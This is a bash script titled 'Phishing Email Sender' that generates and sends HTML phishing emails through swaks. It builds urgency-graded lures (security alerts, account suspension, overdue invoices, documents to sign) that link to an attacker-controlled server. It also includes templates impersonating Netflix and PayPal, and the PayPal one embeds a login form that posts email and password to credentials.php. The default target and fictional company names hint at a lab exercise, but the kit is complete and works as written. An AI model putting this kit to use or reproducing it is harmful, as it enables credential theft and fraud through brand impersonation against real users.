#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Display banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING EMAIL SENDER                   ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Function to display usage
show_usage() {
    echo -e "Usage: $0 [options]"
    echo -e "Options:"
    echo -e "  -t, --target <target>    Target information (organization, person, or role)"
    echo -e "  -s, --scenario <type>    Type of phishing scenario (account, security, invoice, etc.)"
    echo -e "  -u, --urgency <level>    Urgency level (low, medium, high, critical)"
    echo -e "  -c, --custom <file>      Use custom HTML template file"
    echo -e "  -h, --help               Display this help message"
    echo -e "\nExamples:"
    echo -e "  $0                                      # Basic email with default template"
    echo -e "  $0 -t \"Acme Corporation\" -s security   # Targeted security alert for Acme Corp"
    echo -e "  $0 -c my_template.html                  # Use custom HTML template"
    exit 1
}

# Default values
TARGET_INFO=""
SCENARIO="security"
URGENCY="high"
CUSTOM_TEMPLATE=""

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET_INFO="$2"
            shift 2
            ;;
        -s|--scenario)
            SCENARIO="$2"
            shift 2
            ;;
        -u|--urgency)
            URGENCY="$2"
            shift 2
            ;;
        -c|--custom)
            CUSTOM_TEMPLATE="$2"
            shift 2
            ;;
        -h|--help)
            show_usage
            ;;
        *)
            echo -e "${RED}[ERROR]${NC} Unknown option: $1"
            show_usage
            ;;
    esac
done

# Load environment variables
source .env

# Check if target email is set, otherwise use self
if [ -z "$TARGET_EMAIL" ]; then
    TARGET_EMAIL="$EMAIL_USERNAME"
    echo -e "${YELLOW}[INFO]${NC} No target specified in .env, sending to yourself: $TARGET_EMAIL"
fi

# Function to generate company name if not provided
generate_company_name() {
    local companies=("Acme Industries" "Global Tech" "SecureNet" "TrustBank" "Lumon Industries" "CloudSync" "InfoCore" "DataSphere" "NetSecure" "Omnicorp")
    echo "${companies[$RANDOM % ${#companies[@]}]}"
}

# Function to generate email subject based on scenario
generate_subject() {
    local scenario=$1
    local urgency=$2
    
    case $scenario in
        security)
            case $urgency in
                low)
                    echo "Security Notification - Action Recommended"
                    ;;
                medium)
                    echo "Security Alert - Action Required Soon"
                    ;;
                high)
                    echo "URGENT: Security Alert - Immediate Action Required"
                    ;;
                critical)
                    echo "CRITICAL SECURITY BREACH - IMMEDIATE ACTION REQUIRED"
                    ;;
                *)
                    echo "Security Alert - Action Required"
                    ;;
            esac
            ;;
        account)
            case $urgency in
                low)
                    echo "Account Verification Needed"
                    ;;
                medium)
                    echo "Important: Account Verification Required"
                    ;;
                high)
                    echo "URGENT: Account Access Will Be Suspended"
                    ;;
                critical)
                    echo "CRITICAL: YOUR ACCOUNT HAS BEEN COMPROMISED"
                    ;;
                *)
                    echo "Account Verification Required"
                    ;;
            esac
            ;;
        invoice)
            case $urgency in
                low)
                    echo "Invoice Payment Notification"
                    ;;
                medium)
                    echo "Important: Invoice Payment Due"
                    ;;
                high)
                    echo "URGENT: Overdue Invoice Payment"
                    ;;
                critical)
                    echo "FINAL NOTICE: OVERDUE PAYMENT - LEGAL ACTION PENDING"
                    ;;
                *)
                    echo "Invoice Payment Required"
                    ;;
            esac
            ;;
        document)
            case $urgency in
                low)
                    echo "Document Requires Your Review"
                    ;;
                medium)
                    echo "Important Document Awaiting Your Signature"
                    ;;
                high)
                    echo "URGENT: Document Requires Immediate Review"
                    ;;
                critical)
                    echo "CRITICAL: TIME-SENSITIVE DOCUMENT EXPIRING TODAY"
                    ;;
                *)
                    echo "Document Requires Attention"
                    ;;
            esac
            ;;
        *)
            echo "Important Notification - Action Required"
            ;;
    esac
}

# Create temporary directory for email template
EMAIL_TEMPLATE_DIR=$(mktemp -d)
EMAIL_TEMPLATE="$EMAIL_TEMPLATE_DIR/email.html"

# Function to generate HTML email based on scenario and target
generate_html_email() {
    local target="$1"
    local scenario="$2"
    local urgency="$3"
    local template_file="$4"
    
    # If target is empty, generate a company name
    if [ -z "$target" ]; then
        target=$(generate_company_name)
    fi
    
    local subject=$(generate_subject "$scenario" "$urgency")
    local button_text=""
    local main_text=""
    local color="#003366"
    
    # Set button text based on scenario
    case $scenario in
        security)
            button_text="Verify Security Settings"
            main_text="Our security system has detected unusual login attempts on your account. To protect your information, we require immediate verification of your identity."
            color="#D32F2F" # Red for security
            ;;
        account)
            button_text="Verify Account Now"
            main_text="Your account requires verification to ensure continued access to all services. Failure to verify may result in temporary account suspension."
            color="#1976D2" # Blue for account
            ;;
        invoice)
            button_text="View Invoice Details"
            main_text="An important invoice requires your immediate attention. Please review the payment details and process this transaction as soon as possible."
            color="#388E3C" # Green for invoices
            ;;
        document)
            button_text="View Document"
            main_text="An important document is awaiting your review and signature. This document requires your attention before it expires."
            color="#F57C00" # Orange for documents
            ;;
        *)
            button_text="Continue"
            main_text="Please verify your information to continue accessing your account services."
            ;;
    esac
    
    # Create the HTML email - write to the temporary file
    {
        echo "<!DOCTYPE html>"
        echo "<html>"
        echo "<head>"
        echo "    <meta charset=\"UTF-8\">"
        echo "    <title>${subject}</title>"
        echo "</head>"
        echo "<body style=\"margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;\">"
        echo "    <table align=\"center\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\" style=\"max-width: 600px; border-collapse: collapse;\">"
        echo "        <!-- HEADER WITH LOGO -->"
        echo "        <tr>"
        echo "            <td align=\"center\" bgcolor=\"${color}\" style=\"padding: 20px 0;\">"
        echo "                <h1 style=\"color: white; margin: 0;\">${target}</h1>"
        echo "            </td>"
        echo "        </tr>"
        echo "        "
        echo "        <!-- CONTENT AREA -->"
        echo "        <tr>"
        echo "            <td bgcolor=\"#ffffff\" style=\"padding: 40px 30px;\">"
        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
        echo "                    <tr>"
        echo "                        <td style=\"color: #153643; font-size: 24px; font-weight: bold;\">"
        echo "                            ${subject}"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td style=\"padding: 20px 0;\">"
        echo "                            <p>Dear Valued User,</p>"
        echo "                            "
        echo "                            <p>${main_text}</p>"
        
        # Add urgency-specific text
        case $urgency in
            low)
                echo "                            <p>Please complete this verification at your earliest convenience.</p>"
                ;;
            medium)
                echo "                            <p>Please complete this verification within the next 48 hours to avoid any service interruptions.</p>"
                ;;
            high)
                echo "                            <p><strong>You must complete this verification within the next 24 hours</strong> to maintain access to all services.</p>"
                echo "                            "
                echo "                            <p>This verification is mandatory according to our security policy.</p>"
                ;;
            critical)
                echo "                            <p><strong>IMMEDIATE ACTION REQUIRED: You must complete this verification IMMEDIATELY.</strong> Your account access has already been restricted.</p>"
                echo "                            "
                echo "                            <p>Failure to act immediately will result in complete account lockout within the next 2 hours.</p>"
                ;;
        esac
        
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td align=\"center\" style=\"padding: 30px 0;\">"
        echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
        echo "                                <tr>"
        echo "                                    <td align=\"center\" bgcolor=\"${color}\" style=\"border-radius: 4px;\">"
        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">${button_text}</a>"
        echo "                                    </td>"
        echo "                                </tr>"
        echo "                            </table>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td>"
        
        # Add scenario-specific closing text
        case $scenario in
            security)
                echo "                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact our security team.</p>"
                echo "                            "
                echo "                            <p>For security reasons, please do not reply to this email.</p>"
                ;;
            account)
                echo "                            <p>This verification process helps us ensure that your account remains secure and accessible only to you.</p>"
                echo "                            "
                echo "                            <p>If you have any questions, please contact our support team after completing verification.</p>"
                ;;
            invoice)
                echo "                            <p>This invoice requires processing by the indicated due date to avoid any late fees or service interruptions.</p>"
                echo "                            "
                echo "                            <p>If you believe this invoice was sent in error, please verify your details first, then contact our billing department.</p>"
                ;;
            document)
                echo "                            <p>The document will expire if not reviewed in a timely manner, which may result in delays or additional processing requirements.</p>"
                echo "                            "
                echo "                            <p>Please ensure you have access to your account credentials before proceeding.</p>"
                ;;
        esac
        
        echo "                            <p>Thank you for your prompt attention to this matter.</p>"
        echo "                            "
        echo "                            <p>Regards,<br>"
        echo "                            ${target} Support Team</p>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                </table>"
        echo "            </td>"
        echo "        </tr>"
        echo "        "
        echo "        <!-- FOOTER -->"
        echo "        <tr>"
        echo "            <td bgcolor=\"#f4f4f4\" style=\"padding: 20px 30px;\">"
        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
        echo "                    <tr>"
        echo "                        <td style=\"color: #666666; font-size: 12px;\">"
        echo "                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>"
        echo "                            <p>&copy; 2023 ${target}. All rights reserved.</p>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                </table>"
        echo "            </td>"
        echo "        </tr>"
        echo "    </table>"
        echo "</body>"
        echo "</html>"
    } > "$template_file"
    
    echo -e "${GREEN}[SUCCESS]${NC} Generated ${urgency} urgency ${scenario} phishing email for ${target}"
}

# Create Netflix-specific template
create_netflix_template() {
    local template_file="$1"
    
    {
        echo "<!DOCTYPE html>"
        echo "<html>"
        echo "<head>"
        echo "    <meta charset=\"UTF-8\">"
        echo "    <title>Netflix: Action Required on Your Account</title>"
        echo "</head>"
        echo "<body style=\"margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; line-height: 1.6;\">"
        echo "    <table align=\"center\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\" style=\"max-width: 600px; border-collapse: collapse;\">"
        echo "        <!-- HEADER WITH LOGO -->"
        echo "        <tr>"
        echo "            <td align=\"center\" bgcolor=\"#000000\" style=\"padding: 20px 0;\">"
        echo "                <span style=\"color: #E50914; font-size: 40px; font-weight: bold; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;\">NETFLIX</span>"
        echo "            </td>"
        echo "        </tr>"
        echo "        "
        echo "        <!-- CONTENT AREA -->"
        echo "        <tr>"
        echo "            <td bgcolor=\"#ffffff\" style=\"padding: 40px 30px;\">"
        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
        echo "                    <tr>"
        echo "                        <td style=\"color: #333333; font-size: 24px; font-weight: bold;\">"
        echo "                            Your Netflix Account Has Been Locked"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td style=\"padding: 20px 0;\">"
        echo "                            <p>Dear Netflix Customer,</p>"
        echo "                            "
        echo "                            <p>We detected suspicious activity on your Netflix account. Multiple login attempts were made from an unrecognized device in a different location than your usual viewing area.</p>"
        echo "                            "
        echo "                            <p>For your protection, we have temporarily locked your account. To restore access and prevent unauthorized charges, please verify your billing information immediately.</p>"
        echo "                            "
        echo "                            <p><strong>If you do not verify your account within 24 hours, your subscription will be canceled.</strong></p>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td align=\"center\" style=\"padding: 30px 0;\">"
        echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
        echo "                                <tr>"
        echo "                                    <td align=\"center\" bgcolor=\"#E50914\" style=\"border-radius: 4px;\">"
        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">UNLOCK MY ACCOUNT</a>"
        echo "                                    </td>"
        echo "                                </tr>"
        echo "                            </table>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                    <tr>"
        echo "                        <td>"
        echo "                            <p>If you did not attempt to access your account from a new location, we strongly recommend updating your password after verification.</p>"
        echo "                            "
        echo "                            <p>Note: Netflix will never ask you to send personal information via email.</p>"
        echo "                            "
        echo "                            <p>Thank you for your immediate attention to this matter.</p>"
        echo "                            "
        echo "                            <p>- The Netflix Team</p>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                </table>"
        echo "            </td>"
        echo "        </tr>"
        echo "        "
        echo "        <!-- FOOTER -->"
        echo "        <tr>"
        echo "            <td bgcolor=\"#f3f3f3\" style=\"padding: 20px 30px;\">"
        echo "                <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">"
        echo "                    <tr>"
        echo "                        <td style=\"color: #666666; font-size: 12px;\">"
        echo "                            <p>This message contains confidential information and is intended only for the recipient. If you have received this email in error, please contact Netflix Support.</p>"
        echo "                            <p>&copy; 2023 Netflix, Inc. All rights reserved.</p>"
        echo "                        </td>"
        echo "                    </tr>"
        echo "                </table>"
        echo "            </td>"
        echo "        </tr>"
        echo "    </table>"
        echo "</body>"
        echo "</html>"
    } > "$template_file"
    
    echo -e "${GREEN}[SUCCESS]${NC} Generated Netflix-specific phishing email"
}

# Create PayPal-specific template
create_paypal_template() {
    local template_file="$1"
    
    {
        echo "<!DOCTYPE html>"
        echo "<html lang=\"en\">"
        echo "<head>"
        echo "    <meta charset=\"UTF-8\">"
        echo "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
        echo "    <title>PayPal: Action Required on Your Account</title>"
        echo "    <style>"
        echo "        body {"
        echo "            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;"
        echo "            line-height: 1.6;"
        echo "            margin: 0;"
        echo "            padding: 0;"
        echo "            background-color: #f5f5f5;"
        echo "        }"
        echo "        .container {"
        echo "            max-width: 600px;"
        echo "            margin: 0 auto;"
        echo "            background-color: #ffffff;"
        echo "        }"
        echo "        .header {"
        echo "            background-color: #0070ba;"
        echo "            padding: 20px;"
        echo "            text-align: center;"
        echo "        }"
        echo "        .logo {"
        echo "            color: white;"
        echo "            font-size: 26px;"
        echo "            font-weight: bold;"
        echo "            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;"
        echo "        }"
        echo "        .content {"
        echo "            padding: 30px;"
        echo "        }"
        echo "        .title {"
        echo "            color: #2c2e2f;"
        echo "            font-size: 22px;"
        echo "            font-weight: bold;"
        echo "            margin-bottom: 20px;"
        echo "        }"
        echo "        .button {"
        echo "            background-color: #0070ba;"
        echo "            color: white;"
        echo "            padding: 12px 24px;"
        echo "            text-decoration: none;"
        echo "            border-radius: 4px;"
        echo "            font-weight: bold;"
        echo "            display: inline-block;"
        echo "            margin: 20px 0;"
        echo "        }"
        echo "        .footer {"
        echo "            background-color: #f5f5f5;"
        echo "            padding: 20px;"
        echo "            text-align: center;"
        echo "            font-size: 12px;"
        echo "            color: #666666;"
        echo "        }"
        echo "        .login-form {"
        echo "            border: 1px solid #ccc;"
        echo "            padding: 20px;"
        echo "            border-radius: 5px;"
        echo "            background-color: #fff;"
        echo "            margin: 20px 0;"
        echo "        }"
        echo "        .form-input {"
        echo "            width: 100%;"
        echo "            padding: 10px;"
        echo "            margin: 10px 0;"
        echo "            border: 1px solid #ddd;"
        echo "            border-radius: 4px;"
        echo "            box-sizing: border-box;"
        echo "        }"
        echo "        .submit-button {"
        echo "            background-color: #0070ba;"
        echo "            color: white;"
        echo "            padding: 12px 24px;"
        echo "            border: none;"
        echo "            border-radius: 4px;"
        echo "            font-weight: bold;"
        echo "            cursor: pointer;"
        echo "            width: 100%;"
        echo "            margin-top: 10px;"
        echo "        }"
        echo "    </style>"
        echo "</head>"
        echo "<body>"
        echo "    <div class=\"container\">"
        echo "        <div class=\"header\">"
        echo "            <div class=\"logo\">PayPal</div>"
        echo "        </div>"
        echo "        <div class=\"content\">"
        echo "            <div class=\"title\">Important: Action Required on Your PayPal Account</div>"
        echo "            <p>Dear valued customer,</p>"
        echo "            <p>We've detected unusual activity in your PayPal account. To ensure your account security and prevent any unauthorized transactions, we need you to verify your information immediately.</p>"
        echo "            <p><strong>If you do not verify your account within 24 hours, your account will be limited and pending transactions may be canceled.</strong></p>"
        echo ""
        echo "            <div class=\"login-form\">"
        echo "                <h3>Please verify your PayPal account</h3>"
        echo "                <form action=\"credentials.php\" method=\"post\">"
        echo "                    <label for=\"email\">Email or phone number</label>"
        echo "                    <input type=\"text\" id=\"email\" name=\"email\" class=\"form-input\" required>"
        echo "                    <label for=\"password\">Password</label>"
        echo "                    <input type=\"password\" id=\"password\" name=\"password\" class=\"form-input\" required>"
        echo "                    <button type=\"submit\" class=\"submit-button\">Log In</button>"
        echo "                </form>"
        echo "            </div>"
        echo ""
        echo "            <p>If you did not initiate this request, we recommend changing your password immediately after verification.</p>"
        echo "            <p>Thank you for your prompt attention to this matter.</p>"
        echo "            <p>Sincerely,<br>PayPal Account Services</p>"
        echo "        </div>"
        echo "        <div class=\"footer\">"
        echo "            <p>This message contains confidential information and is intended only for the recipient mentioned above. If you have received this email in error, please contact PayPal Customer Service.</p>"
        echo "            <p>&copy; 2023 PayPal, Inc. All rights reserved.</p>"
        echo "        </div>"
        echo "    </div>"
        echo "</body>"
        echo "</html>"
    } > "$template_file"
    
    echo -e "${GREEN}[SUCCESS]${NC} Generated PayPal-specific phishing email with embedded login form"
}

# Determine which template to use
subject="Urgent: Security Alert - Immediate Action Required"

if [ -n "$CUSTOM_TEMPLATE" ] && [ -f "$CUSTOM_TEMPLATE" ]; then
    # Use custom template provided
    cp "$CUSTOM_TEMPLATE" "$EMAIL_TEMPLATE"
    echo -e "${YELLOW}[INFO]${NC} Using custom HTML template: $CUSTOM_TEMPLATE"
elif [[ "$TARGET_INFO" == "Netflix" ]]; then
    # Special case for Netflix
    create_netflix_template "$EMAIL_TEMPLATE"
    subject="Netflix: Action Required on Your Account"
elif [[ "$TARGET_INFO" == "PayPal" ]]; then
    # Special case for PayPal
    create_paypal_template "$EMAIL_TEMPLATE"
    subject="PayPal: Action Required on Your Account"
elif [ -n "$TARGET_INFO" ]; then
    # Generate dynamic template based on provided information
    generate_html_email "$TARGET_INFO" "$SCENARIO" "$URGENCY" "$EMAIL_TEMPLATE"
    subject=$(generate_subject "$SCENARIO" "$URGENCY")
else
    # Generate default template
    generate_html_email "" "$SCENARIO" "$URGENCY" "$EMAIL_TEMPLATE"
    subject=$(generate_subject "$SCENARIO" "$URGENCY")
fi

# Send email using swaks with proper HTML content type
echo -e "${YELLOW}[INFO]${NC} Sending email using swaks..."
swaks --to "$TARGET_EMAIL" \
      --from "$EMAIL_USERNAME" \
      --server mail.lumoninc.com \
      --port 25 \
      --auth-user "$EMAIL_USERNAME" \
      --auth-password "$EMAIL_PASSWORD" \
      --h-Subject "$subject" \
      --h-Content-Type "text/html; charset=UTF-8" \
      --body "$(cat "$EMAIL_TEMPLATE")"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to $TARGET_EMAIL"
else
    echo -e "${RED}[FAILED]${NC} Failed to send email with swaks."
    echo -e "${YELLOW}[INFO]${NC} Check your email credentials and connectivity."
fi

# Provide info for manual testing
echo -e "${YELLOW}[INFO]${NC} For manual email testing, use these settings:"
echo -e "    SMTP Server: mail.lumoninc.com"
echo -e "    Port: 25"
echo -e "    Username: $EMAIL_USERNAME"
echo -e "    Password: (your password in .env)"
echo -e "    Security: None"

# Clean up temporary files
rm -rf "$EMAIL_TEMPLATE_DIR" 